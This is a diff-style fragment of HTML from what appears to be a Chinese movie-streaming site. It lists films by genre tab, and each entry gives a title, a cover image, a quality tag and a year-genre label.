+                        <dd><a href="javascript:void(0);">推荐</a></dd>
+                                                <dd><a href="/vodtype/6.html">动作片</a></dd>
+                                                <dd><a href="/vodtype/7.html">喜剧片</a></dd>
+                                                <dd><a href="/vodtype/8.html">爱情片</a></dd>
+                                                <dd><a href="/vodtype/9.html">科幻片</a></dd>
+                                                <dd><a href="/vodtype/10.html">恐怖片</a></dd>
+                                                <dd><a href="/vodtype/11.html">剧情片</a></dd>
+                                                <dd><a href="/vodtype/12.html">战争片</a></dd>
+                                            </dl>
+                </div>
+                <div class="bd clearfix">
+                    <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96515.html" title="森中有林" target="_blank"><img src="/upload/vod/20260627-1/f1af01fe0ca36e88c348d0b0c7f06f4b.jpg" alt="森中有林" /><i></i><em>HD</em></a><b><a href="/voddetail/96515.html" title="森中有林" target="_blank">森中有林..</a></b>
+                            <p>2026-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96317.html" title="罗宾汉之死" target="_blank"><img src="/upload/vod/20260621-1/1771b005c56da31bacd524b7b5c2af37.jpg" alt="罗宾汉之死" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96317.html" title="罗宾汉之死" target="_blank">罗宾汉之死..</a></b>
+                            <p>2026-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96565.html" title="糖精" target="_blank"><img src="/upload/vod/20260629-1/2bb9e22596c93fed266b6145821416eb.jpg" alt="糖精" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96565.html" title="糖精" target="_blank">糖精..</a></b>
+                            <p>2026-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96564.html" title="牛骷髅村" target="_blank"><img src="/upload/vod/20260629-1/f7c28f95909c81f789a2eba04967fcb3.jpg" alt="牛骷髅村" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96564.html" title="牛骷髅村" target="_blank">牛骷髅村..</a></b>
+                            <p>2025-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96563.html" title="鬼区死守" target="_blank"><img src="/upload/vod/20260629-1/a3869c359f9df406796ec81f7484b37f.jpg" alt="鬼区死守" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96563.html" title="鬼区死守" target="_blank">鬼区死守..</a></b>
+                            <p>2025-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96562.html" title="宗师叶问2" target="_blank"><img src="/upload/vod/20260629-1/5416633bd63b0dbdf9546f845440770e.webp" alt="宗师叶问2" /><i></i><em>HD</em></a><b><a href="/voddetail/96562.html" title="宗师叶问2" target="_blank">宗师叶问2..</a></b>
+                            <p>2026-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96561.html" title="世界奇妙物语2026夏季特别篇" target="_blank"><img src="/upload/vod/20260629-1/134add19facaf3759df34b658d49ac21.webp" alt="世界奇妙物语2026夏季特别篇" /><i></i><em>HD</em></a><b><a href="/voddetail/96561.html" title="世界奇妙物语2026夏季特别篇" target="_blank">世界奇妙物语2026..</a></b>
+                            <p>2026-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96532.html" title="午夜电梯" target="_blank"><img src="/upload/vod/20260628-1/021a8356881b0be79b2a81369c201f14.jpg" alt="午夜电梯" /><i></i><em>HD</em></a><b><a href="/voddetail/96532.html" title="午夜电梯" target="_blank">午夜电梯..</a></b>
+                            <p>2026-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96518.html" title="幻犬诳猫" target="_blank"><img src="/upload/vod/20260627-1/54b0aab868088b976ea58f487d9e14e6.jpg" alt="幻犬诳猫" /><i></i><em>HD</em></a><b><a href="/voddetail/96518.html" title="幻犬诳猫" target="_blank">幻犬诳猫..</a></b>
+                            <p>2025-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96560.html" title="古田军号" target="_blank"><img src="/upload/vod/20260629-1/58ffa5622cc0b882fecaaa2be3b375db.jpg" alt="古田军号" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96560.html" title="古田军号" target="_blank">古田军号..</a></b>
+                            <p>2019-战争</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96562.html" title="宗师叶问2" target="_blank"><img src="/upload/vod/20260629-1/5416633bd63b0dbdf9546f845440770e.webp" alt="宗师叶问2" /><i></i><em>HD</em></a><b><a href="/voddetail/96562.html" title="宗师叶问2" target="_blank">宗师叶问2..</a></b>
+                            <p>2026-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96549.html" title="基因世代" target="_blank"><img src="/upload/vod/20260629-1/3954fb576c1295e12ec4414757182ac4.jpg" alt="基因世代" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96549.html" title="基因世代" target="_blank">基因世代..</a></b>
+                            <p>2007-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96534.html" title="杀戮屋" target="_blank"><img src="/upload/vod/20260628-1/549f0f484110aa086e9c3e9855fddfd8.webp" alt="杀戮屋" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96534.html" title="杀戮屋" target="_blank">杀戮屋..</a></b>
+                            <p>2026-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96529.html" title="超级少女2026" target="_blank"><img src="/upload/vod/20260628-1/d97fafe8be389a22a7e1981aa7a7778c.jpg" alt="超级少女2026" /><i></i><em>更新TC</em></a><b><a href="/voddetail/96529.html" title="超级少女2026" target="_blank">超级少女2026..</a></b>
+                            <p>2026-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96522.html" title="公民义警" target="_blank"><img src="/upload/vod/20260627-1/0fd35513308e0229d9938308b7d3fac0.webp" alt="公民义警" /><i></i><em>HD</em></a><b><a href="/voddetail/96522.html" title="公民义警" target="_blank">公民义警..</a></b>
+                            <p>2026-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96432.html" title="重出江湖2026" target="_blank"><img src="/upload/vod/20260625-1/bf727816fc64ea73e19bbe3ee365cafc.webp" alt="重出江湖2026" /><i></i><em>HD</em></a><b><a href="/voddetail/96432.html" title="重出江湖2026" target="_blank">重出江湖2026..</a></b>
+                            <p>2026-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96435.html" title="重出江湖2026" target="_blank"><img src="/upload/vod/20260625-1/b9d1bbd45a3d246b3117a8caa446e2ec.webp" alt="重出江湖2026" /><i></i><em>HD</em></a><b><a href="/voddetail/96435.html" title="重出江湖2026" target="_blank">重出江湖2026..</a></b>
+                            <p>2026-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96427.html" title="绝密任务2026" target="_blank"><img src="/upload/vod/20260625-1/d3327ce4d15c57ba4fe5dad337ab81de.jpg" alt="绝密任务2026" /><i></i><em>更新TC</em></a><b><a href="/voddetail/96427.html" title="绝密任务2026" target="_blank">绝密任务2026..</a></b>
+                            <p>2026-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96403.html" title="公民义警" target="_blank"><img src="/upload/vod/20260624-1/55437019712a002f44fff96241ddb5f6.jpg" alt="公民义警" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96403.html" title="公民义警" target="_blank">公民义警..</a></b>
+                            <p>2026-动作</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96382.html" title="生命禁区" target="_blank"><img src="/upload/vod/20260623-1/5e57fc15672b8350a3a6580867374bb4.jpg" alt="生命禁区" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96382.html" title="生命禁区" target="_blank">生命禁区..</a></b>
+                            <p>2024-动作</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96536.html" title="戏曲小子" target="_blank"><img src="/upload/vod/20260628-1/fb0d2c5c511f762ca646ae9217c5736a.jpg" alt="戏曲小子" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96536.html" title="戏曲小子" target="_blank">戏曲小子..</a></b>
+                            <p>2014-喜剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96528.html" title="蠢蛋搞怪秀5" target="_blank"><img src="/upload/vod/20260628-1/00c559be59ba1af8fffbd8b9b97ae7bd.jpg" alt="蠢蛋搞怪秀5" /><i></i><em>更新TC</em></a><b><a href="/voddetail/96528.html" title="蠢蛋搞怪秀5" target="_blank">蠢蛋搞怪秀5..</a></b>
+                            <p>2026-喜剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96494.html" title="人生大弟震" target="_blank"><img src="/upload/vod/20260626-1/b4bb7ce7469691775f7a60787251abd3.webp" alt="人生大弟震" /><i></i><em>HD</em></a><b><a href="/voddetail/96494.html" title="人生大弟震" target="_blank">人生大弟震..</a></b>
+                            <p>2026-喜剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96523.html" title="你我在托斯卡纳" target="_blank"><img src="/upload/vod/20260627-1/73daa6b360f01fa69aa93b34c018edd4.webp" alt="你我在托斯卡纳" /><i></i><em>HD</em></a><b><a href="/voddetail/96523.html" title="你我在托斯卡纳" target="_blank">你我在托斯卡纳..</a></b>
+                            <p>2026-喜剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96481.html" title="大酱2025" target="_blank"><img src="/upload/vod/20260626-1/9d936a8df16a8df32f477d7e1b076228.webp" alt="大酱2025" /><i></i><em>HD</em></a><b><a href="/voddetail/96481.html" title="大酱2025" target="_blank">大酱2025..</a></b>
+                            <p>2025-喜剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96438.html" title="绵羊侦探团" target="_blank"><img src="/upload/vod/20260625-1/3587649acaeab17f177e02d4fb90c370.webp" alt="绵羊侦探团" /><i></i><em>HD</em></a><b><a href="/voddetail/96438.html" title="绵羊侦探团" target="_blank">绵羊侦探团..</a></b>
+                            <p>2026-喜剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96433.html" title="玛莎和熊2025" target="_blank"><img src="/upload/vod/20260625-1/6dfbe5ff41ea0fbefa6b103851e1bb24.webp" alt="玛莎和熊2025" /><i></i><em>HD</em></a><b><a href="/voddetail/96433.html" title="玛莎和熊2025" target="_blank">玛莎和熊2025..</a></b>
+                            <p>2025-喜剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96425.html" title="仙女鸟飞过的夏天" target="_blank"><img src="/upload/vod/20260625-1/cd1f07c9e1d59efc5e052b93bdce88ac.jpg" alt="仙女鸟飞过的夏天" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96425.html" title="仙女鸟飞过的夏天" target="_blank">仙女鸟飞过的夏天..</a></b>
+                            <p>2024-喜剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96411.html" title="绵羊侦探团" target="_blank"><img src="/upload/vod/20260624-1/b7251be78570d51cd1f50770bbca6bda.jpg" alt="绵羊侦探团" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96411.html" title="绵羊侦探团" target="_blank">绵羊侦探团..</a></b>
+                            <p>2026-喜剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96407.html" title="有戏了" target="_blank"><img src="/upload/vod/20260624-1/2e5343ebd94e9162f3891c014fcd8de8.jpg" alt="有戏了" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96407.html" title="有戏了" target="_blank">有戏了..</a></b>
+                            <p>2024-喜剧</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96537.html" title="假如爱情欺骗了你" target="_blank"><img src="/upload/vod/20260628-1/b0fbbd979aee7504ba918215a9508897.jpg" alt="假如爱情欺骗了你" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96537.html" title="假如爱情欺骗了你" target="_blank">假如爱情欺骗了你..</a></b>
+                            <p>2024-爱情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95452.html" title="平场之月" target="_blank"><img src="/upload/vod/20260506-1/bf6772bf17be95c7dc8b7992e5feeba0.webp" alt="平场之月" /><i></i><em>更新HD</em></a><b><a href="/voddetail/95452.html" title="平场之月" target="_blank">平场之月..</a></b>
+                            <p>2025-爱情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96514.html" title="谎岛美人鱼" target="_blank"><img src="/upload/vod/20260627-1/7e2b7a45c0919e2b52a9165624a15726.jpg" alt="谎岛美人鱼" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96514.html" title="谎岛美人鱼" target="_blank">谎岛美人鱼..</a></b>
+                            <p>2024-爱情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96436.html" title="与你同程" target="_blank"><img src="/upload/vod/20260625-1/30eea62b51f7baa5d37a51fa28ae8bea.webp" alt="与你同程" /><i></i><em>HD</em></a><b><a href="/voddetail/96436.html" title="与你同程" target="_blank">与你同程..</a></b>
+                            <p>2026-爱情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96365.html" title="凤鸣飞天" target="_blank"><img src="/upload/vod/20260623-1/68c4a9a16ee4270f31cbb69c07a1208c.jpg" alt="凤鸣飞天" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96365.html" title="凤鸣飞天" target="_blank">凤鸣飞天..</a></b>
+                            <p>2024-爱情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96349.html" title="倔强的厨子" target="_blank"><img src="/upload/vod/20260622-1/93151eb8650dbe9276689972a38eb1d6.jpg" alt="倔强的厨子" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96349.html" title="倔强的厨子" target="_blank">倔强的厨子..</a></b>
+                            <p>2019-爱情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96309.html" title="你的约定" target="_blank"><img src="/upload/vod/20260620-1/9c661f890d5ff7aa1979fa288e653a41.jpg" alt="你的约定" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96309.html" title="你的约定" target="_blank">你的约定..</a></b>
+                            <p>2024-爱情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96165.html" title="爱的恋习生" target="_blank"><img src="/upload/vod/20260616-1/ed1488213fdd123be39a62d0787d9bf9.jpg" alt="爱的恋习生" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96165.html" title="爱的恋习生" target="_blank">爱的恋习生..</a></b>
+                            <p>2026-爱情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96120.html" title="失明2025" target="_blank"><img src="/upload/vod/20260613-1/a0674584d1a6fb5abe20de7ed8e2f3ad.webp" alt="失明2025" /><i></i><em>HD</em></a><b><a href="/voddetail/96120.html" title="失明2025" target="_blank">失明2025..</a></b>
+                            <p>2025-爱情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96125.html" title="生命的荣耀" target="_blank"><img src="/upload/vod/20260613-1/a3f46c156f42ba6294385ff46cfafdb8.webp" alt="生命的荣耀" /><i></i><em>HD</em></a><b><a href="/voddetail/96125.html" title="生命的荣耀" target="_blank">生命的荣耀..</a></b>
+                            <p>2024-爱情</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96531.html" title="后室" target="_blank"><img src="/upload/vod/20260628-1/9bb3abc03de6c6655d573e4252a4a94a.jpg" alt="后室" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96531.html" title="后室" target="_blank">后室..</a></b>
+                            <p>2026-科幻</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95954.html" title="宇宙巨人：希曼崛起" target="_blank"><img src="/upload/vod/20260605-1/5dc6274ca63ca2c4c62a891412d6533e.jpg" alt="宇宙巨人：希曼崛起" /><i></i><em>更新HD</em></a><b><a href="/voddetail/95954.html" title="宇宙巨人：希曼崛起" target="_blank">宇宙巨人：希曼崛起..</a></b>
+                            <p>2026-科幻</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96455.html" title="机械军团" target="_blank"><img src="/upload/vod/20260625-1/17f6362f849f2622157b7459b44990c9.jpg" alt="机械军团" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96455.html" title="机械军团" target="_blank">机械军团..</a></b>
+                            <p>2026-科幻</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95793.html" title="星球大战：曼达洛人与古古" target="_blank"><img src="/upload/vod/20260527-1/22eab54a2aca12709c4518286fb09602.webp" alt="星球大战：曼达洛人与古古" /><i></i><em>更新HD</em></a><b><a href="/voddetail/95793.html" title="星球大战：曼达洛人与古古" target="_blank">星球大战：曼达洛人与..</a></b>
+                            <p>2026-科幻</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96414.html" title="去火星" target="_blank"><img src="/upload/vod/20260624-1/1e78cd91940fe0e5fd75c59bb8ca84cd.jpg" alt="去火星" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96414.html" title="去火星" target="_blank">去火星..</a></b>
+                            <p>2026-科幻</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96191.html" title="惊夜有囍" target="_blank"><img src="/upload/vod/20260616-1/777d915037d07a488d50b0d41151aaec.jpg" alt="惊夜有囍" /><i></i><em>HD</em></a><b><a href="/voddetail/96191.html" title="惊夜有囍" target="_blank">惊夜有囍..</a></b>
+                            <p>2026-科幻</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/36444.html" title="混凝土乌托邦" target="_blank"><img src="/upload/vod/20251019-27/9dabd66595aebaf4258ae8898f12fead.jpg" alt="混凝土乌托邦" /><i></i><em>更新HD</em></a><b><a href="/voddetail/36444.html" title="混凝土乌托邦" target="_blank">混凝土乌托邦..</a></b>
+                            <p>2023-科幻</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96142.html" title="人格2025" target="_blank"><img src="/upload/vod/20260614-1/ac382d6cef712afe227e5e8107d12587.webp" alt="人格2025" /><i></i><em>HD</em></a><b><a href="/voddetail/96142.html" title="人格2025" target="_blank">人格2025..</a></b>
+                            <p>2025-科幻</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96090.html" title="揭秘日" target="_blank"><img src="/upload/vod/20260611-1/4cb24f3b765b3dae879de0d6904e2897.jpg" alt="揭秘日" /><i></i><em>更新TC</em></a><b><a href="/voddetail/96090.html" title="揭秘日" target="_blank">揭秘日..</a></b>
+                            <p>2026-科幻</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/90145.html" title="追杀51号" target="_blank"><img src="/upload/vod/20251023-1/541965c453c78667e776b9a33b64a2b3.jpg" alt="追杀51号" /><i></i><em>HD</em></a><b><a href="/voddetail/90145.html" title="追杀51号" target="_blank">追杀51号..</a></b>
+                            <p>2025-科幻</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96565.html" title="糖精" target="_blank"><img src="/upload/vod/20260629-1/2bb9e22596c93fed266b6145821416eb.jpg" alt="糖精" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96565.html" title="糖精" target="_blank">糖精..</a></b>
+                            <p>2026-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96564.html" title="牛骷髅村" target="_blank"><img src="/upload/vod/20260629-1/f7c28f95909c81f789a2eba04967fcb3.jpg" alt="牛骷髅村" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96564.html" title="牛骷髅村" target="_blank">牛骷髅村..</a></b>
+                            <p>2025-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96563.html" title="鬼区死守" target="_blank"><img src="/upload/vod/20260629-1/a3869c359f9df406796ec81f7484b37f.jpg" alt="鬼区死守" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96563.html" title="鬼区死守" target="_blank">鬼区死守..</a></b>
+                            <p>2025-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96561.html" title="世界奇妙物语2026夏季特别篇" target="_blank"><img src="/upload/vod/20260629-1/134add19facaf3759df34b658d49ac21.webp" alt="世界奇妙物语2026夏季特别篇" /><i></i><em>HD</em></a><b><a href="/voddetail/96561.html" title="世界奇妙物语2026夏季特别篇" target="_blank">世界奇妙物语2026..</a></b>
+                            <p>2026-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96532.html" title="午夜电梯" target="_blank"><img src="/upload/vod/20260628-1/021a8356881b0be79b2a81369c201f14.jpg" alt="午夜电梯" /><i></i><em>HD</em></a><b><a href="/voddetail/96532.html" title="午夜电梯" target="_blank">午夜电梯..</a></b>
+                            <p>2026-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96516.html" title="邪引" target="_blank"><img src="/upload/vod/20260627-1/181c24bf08edf525e7954bf657652f08.jpg" alt="邪引" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96516.html" title="邪引" target="_blank">邪引..</a></b>
+                            <p>2023-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95414.html" title="蝴蝶楼·惊魂" target="_blank"><img src="/upload/vod/20260504-1/c49f282e1def80ce14bd8de2efda7b26.jpg" alt="蝴蝶楼·惊魂" /><i></i><em>HD</em></a><b><a href="/voddetail/95414.html" title="蝴蝶楼·惊魂" target="_blank">蝴蝶楼·惊魂..</a></b>
+                            <p>2026-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95951.html" title="惊声尖笑6" target="_blank"><img src="/upload/vod/20260605-1/a4285525c2bcd87b17817f3860af40bb.jpg" alt="惊声尖笑6" /><i></i><em>更新HD</em></a><b><a href="/voddetail/95951.html" title="惊声尖笑6" target="_blank">惊声尖笑6..</a></b>
+                            <p>2026-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96482.html" title="风水大师与孕鬼" target="_blank"><img src="/upload/vod/20260626-1/5d56256cd4912ad61172826a9c59e3e6.webp" alt="风水大师与孕鬼" /><i></i><em>HD</em></a><b><a href="/voddetail/96482.html" title="风水大师与孕鬼" target="_blank">风水大师与孕鬼..</a></b>
+                            <p>2025-恐怖</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96466.html" title="哀怨声声" target="_blank"><img src="/upload/vod/20260626-1/b44b8b5ead3497ac54aaff74f5bd507c.jpg" alt="哀怨声声" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96466.html" title="哀怨声声" target="_blank">哀怨声声..</a></b>
+                            <p>2026-恐怖</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96515.html" title="森中有林" target="_blank"><img src="/upload/vod/20260627-1/f1af01fe0ca36e88c348d0b0c7f06f4b.jpg" alt="森中有林" /><i></i><em>HD</em></a><b><a href="/voddetail/96515.html" title="森中有林" target="_blank">森中有林..</a></b>
+                            <p>2026-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96317.html" title="罗宾汉之死" target="_blank"><img src="/upload/vod/20260621-1/1771b005c56da31bacd524b7b5c2af37.jpg" alt="罗宾汉之死" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96317.html" title="罗宾汉之死" target="_blank">罗宾汉之死..</a></b>
+                            <p>2026-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96518.html" title="幻犬诳猫" target="_blank"><img src="/upload/vod/20260627-1/54b0aab868088b976ea58f487d9e14e6.jpg" alt="幻犬诳猫" /><i></i><em>HD</em></a><b><a href="/voddetail/96518.html" title="幻犬诳猫" target="_blank">幻犬诳猫..</a></b>
+                            <p>2025-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96558.html" title="炽热年华" target="_blank"><img src="/upload/vod/20260629-1/0ae3d70168f592ed1f59acd239bbf200.jpg" alt="炽热年华" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96558.html" title="炽热年华" target="_blank">炽热年华..</a></b>
+                            <p>2025-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96557.html" title="爆裂蝴蝶" target="_blank"><img src="/upload/vod/20260629-1/bdc45ca96bd8dad8338fde5660e8f730.jpg" alt="爆裂蝴蝶" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96557.html" title="爆裂蝴蝶" target="_blank">爆裂蝴蝶..</a></b>
+                            <p>2022-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96554.html" title="孤独的守望者" target="_blank"><img src="/upload/vod/20260629-1/ec8fb7de022715c00f9deaa949e067cb.jpg" alt="孤独的守望者" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96554.html" title="孤独的守望者" target="_blank">孤独的守望者..</a></b>
+                            <p>2022-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96551.html" title="蛋糕少年的奇幻之旅" target="_blank"><img src="/upload/vod/20260629-1/839112bdfb65cc1bc22aab81aa421d18.jpg" alt="蛋糕少年的奇幻之旅" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96551.html" title="蛋糕少年的奇幻之旅" target="_blank">蛋糕少年的奇幻之旅..</a></b>
+                            <p>2019-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96546.html" title="五天五夜" target="_blank"><img src="/upload/vod/20260629-1/fd3ea4b480ad58cd9d98a2fa46fbee3c.jpg" alt="五天五夜" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96546.html" title="五天五夜" target="_blank">五天五夜..</a></b>
+                            <p>1961-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96540.html" title="世界奇妙物语 2026夏季特别篇" target="_blank"><img src="/upload/vod/20260628-1/19532b07cf3a99221f3d16ff88defc3e.jpg" alt="世界奇妙物语 2026夏季特别篇" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96540.html" title="世界奇妙物语 2026夏季特别篇" target="_blank">世界奇妙物语 202..</a></b>
+                            <p>2026-剧情</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96539.html" title="激情邀约" target="_blank"><img src="/upload/vod/20260628-1/79fbc7e14612aefe8ee51f4e68d2b83b.jpg" alt="激情邀约" /><i></i><em>更新TC</em></a><b><a href="/voddetail/96539.html" title="激情邀约" target="_blank">激情邀约..</a></b>
+                            <p>2026-剧情</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96560.html" title="古田军号" target="_blank"><img src="/upload/vod/20260629-1/58ffa5622cc0b882fecaaa2be3b375db.jpg" alt="古田军号" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96560.html" title="古田军号" target="_blank">古田军号..</a></b>
+                            <p>2019-战争</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96548.html" title="华侨女英雄李林" target="_blank"><img src="/upload/vod/20260629-1/a5f2e5f2aed149c905405c5fb829e489.jpg" alt="华侨女英雄李林" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96548.html" title="华侨女英雄李林" target="_blank">华侨女英雄李林..</a></b>
+                            <p>2025-战争</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96350.html" title="大唐天下之帝王末路" target="_blank"><img src="/upload/vod/20260622-1/4749c65d8d88c2cac91772918b92817f.jpg" alt="大唐天下之帝王末路" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96350.html" title="大唐天下之帝王末路" target="_blank">大唐天下之帝王末路..</a></b>
+                            <p>2022-战争</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96301.html" title="诺曼底72小时" target="_blank"><img src="/upload/vod/20260620-1/58b854883eac3ee1e9ebc7ab9e2341c6.webp" alt="诺曼底72小时" /><i></i><em>HD</em></a><b><a href="/voddetail/96301.html" title="诺曼底72小时" target="_blank">诺曼底72小时..</a></b>
+                            <p>2026-战争</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96116.html" title="生化巨兽" target="_blank"><img src="/upload/vod/20260613-1/c381e8b40322e24c7f715bd38a8ba5a9.jpg" alt="生化巨兽" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96116.html" title="生化巨兽" target="_blank">生化巨兽..</a></b>
+                            <p>2026-战争</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96069.html" title="打铁花行动" target="_blank"><img src="/upload/vod/20260611-1/ed5d8e764cf23d7a1efa2bfb7faedbd7.jpg" alt="打铁花行动" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96069.html" title="打铁花行动" target="_blank">打铁花行动..</a></b>
+                            <p>2025-战争</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95390.html" title="东北往事·极恶不赦" target="_blank"><img src="/upload/vod/20260503-1/8bc598259aa5cf7581322f44e188c7e1.jpg" alt="东北往事·极恶不赦" /><i></i><em>HD</em></a><b><a href="/voddetail/95390.html" title="东北往事·极恶不赦" target="_blank">东北往事·极恶不赦..</a></b>
+                            <p>2026-战争</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95165.html" title="英雄三元里" target="_blank"><img src="/upload/vod/20260422-1/397d3ee6500e8cb075e2e0c970c55555.webp" alt="英雄三元里" /><i></i><em>HD</em></a><b><a href="/voddetail/95165.html" title="英雄三元里" target="_blank">英雄三元里..</a></b>
+                            <p>2025-战争</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94372.html" title="我们的天空，我们的河" target="_blank"><img src="/upload/vod/20260326-1/1a6cde236fc6daf2fd803e2528167007.webp" alt="我们的天空，我们的河" /><i></i><em>HD</em></a><b><a href="/voddetail/94372.html" title="我们的天空，我们的河" target="_blank">我们的天空，我们的河..</a></b>
+                            <p>2021-战争</p>
+                        </li>
